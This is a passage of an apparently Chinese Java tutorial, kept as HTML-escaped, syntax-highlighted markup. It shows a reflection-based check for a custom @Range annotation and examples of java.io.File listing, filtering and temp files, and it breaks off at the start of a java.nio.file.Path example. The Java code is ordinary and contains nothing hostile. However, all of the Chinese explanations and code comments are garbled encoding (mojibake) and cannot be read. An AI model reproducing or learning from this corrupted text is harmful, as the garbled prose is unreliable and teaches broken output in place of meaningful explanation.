&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Annotation&lt;/span> &lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @Rangeæ³¨è§£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @NotNullæ³¨è§£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">NotNull&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®šä¹‰äº†æ³¨è§£ï¼Œæœ¬èº«å¯¹ç¨‹åºé€»è¾‘æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå¿…é¡»è‡ªå·±ç¼–å†™ä»£ç æ¥ä½¿ç”¨æ³¨è§£&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FIELD&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">255&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ReflectiveOperationException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// éåŽ†æ‰€æœ‰Field:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getFields&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// èŽ·å–Fieldå®šä¹‰çš„@Range:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å¦‚æžœ@Rangeå­˜åœ¨:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// èŽ·å–Fieldçš„å€¼:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å¦‚æžœå€¼æ˜¯String:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// åˆ¤æ–­å€¼æ˜¯å¦æ»¡è¶³@Rangeçš„min/max:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid field: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬é€šè¿‡&lt;code>@Range&lt;/code>æ³¨è§£ï¼Œé…åˆ&lt;code>check()&lt;/code>æ–¹æ³•ï¼Œå°±å¯ä»¥å®Œæˆ&lt;code>Person&lt;/code>å®žä¾‹çš„æ£€æŸ¥ã€‚æ³¨æ„æ£€æŸ¥é€»è¾‘å®Œå…¨æ˜¯æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ï¼ŒJVMä¸ä¼šè‡ªåŠ¨ç»™æ³¨è§£æ·»åŠ ä»»ä½•é¢å¤–çš„é€»è¾‘ã€‚&lt;/p>
&lt;h2 id="io">IO&lt;/h2>
&lt;h3 id="filepath">File&amp;amp;Path&lt;/h3>
&lt;ul>
&lt;li>æ ‡å‡†åº“&lt;code>java.io&lt;/code>æä¾›&lt;code>File&lt;/code>å¯¹è±¡æ¥æ“ä½œæ–‡ä»¶å’Œç›®å½•ï¼Œå¯ä»¥ä¼ å…¥ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ï¼›å³ä½¿ä¼ å…¥çš„ä¸å­˜åœ¨ä¹Ÿä¸æŠ¥é”™ï¼Œå¯ä»¥ç”¨&lt;code>isFile&lt;/code>, &lt;code>isDirectory&lt;/code>è¿›è¡Œæ£€æŸ¥&lt;/li>
&lt;li>&lt;code>File&lt;/code>å¯¹è±¡æ—¢å¯ä»¥è¡¨ç¤ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è¡¨ç¤ºç›®å½•ï¼Œå¯ä»¥ç”¨&lt;code>getPath&lt;/code>(ä¼ å…¥è·¯å¾„), &lt;code>getAbsolutePath&lt;/code>(ç»å¯¹è·¯å¾„), &lt;code>getCanonicalPath&lt;/code>(è§„èŒƒè·¯å¾„)&lt;/li>
&lt;li>å½“Fileå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªç›®å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨&lt;code>list()&lt;/code>å’Œ&lt;code>listFiles()&lt;/code>åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•åï¼Œ&lt;code>listFiles()&lt;/code>æä¾›äº†ä¸€ç³»åˆ—é‡è½½æ–¹æ³•ï¼Œå¯ä»¥è¿‡æ»¤ä¸æƒ³è¦çš„æ–‡ä»¶å’Œç›®å½•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;C:\\Windows&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FilenameFilter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// ä»…åˆ—å‡º.exeæ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¿”å›žtrueè¡¨ç¤ºæŽ¥å—è¯¥æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å…¶å®ƒAPI&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>boolean canRead()ï¼šæ˜¯å¦å¯è¯»
boolean canWrite()ï¼šæ˜¯å¦å¯å†™
boolean canExecute()ï¼šæ˜¯å¦å¯æ‰§è¡Œ
long length()ï¼šæ–‡ä»¶å­—èŠ‚å¤§å°
boolean mkdir()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•
boolean mkdirs()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå¹¶åœ¨å¿…è¦æ—¶å°†ä¸å­˜åœ¨çš„çˆ¶ç›®å½•ä¹Ÿåˆ›å»ºå‡ºæ¥
boolean delete()ï¼šåˆ é™¤å½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå½“å‰ç›®å½•å¿…é¡»ä¸ºç©ºæ‰èƒ½åˆ é™¤æˆåŠŸ
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>å¯ä»¥ç”¨&lt;code>createTempFile()&lt;/code>æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œä»¥åŠ&lt;code>deleteOnExit()&lt;/code>åœ¨JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤è¯¥æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createTempFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp-&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æä¾›ä¸´æ—¶æ–‡ä»¶çš„å‰ç¼€å’ŒåŽç¼€
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">deleteOnExit&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFile&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAbsolutePath&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>Path&lt;/code>å¯¹è±¡ä½äºŽ&lt;code>java.nio.file&lt;/code>åŒ…ï¼Œå’Œ&lt;code>File&lt;/code>å¯¹è±¡ç±»ä¼¼ï¼Œä½†æ“ä½œæ›´åŠ ç®€å•ï¼Œä¾¿äºŽæ“ä½œç›®å½•çš„æ‹¼æŽ¥ã€éåŽ†ç­‰&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.file.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
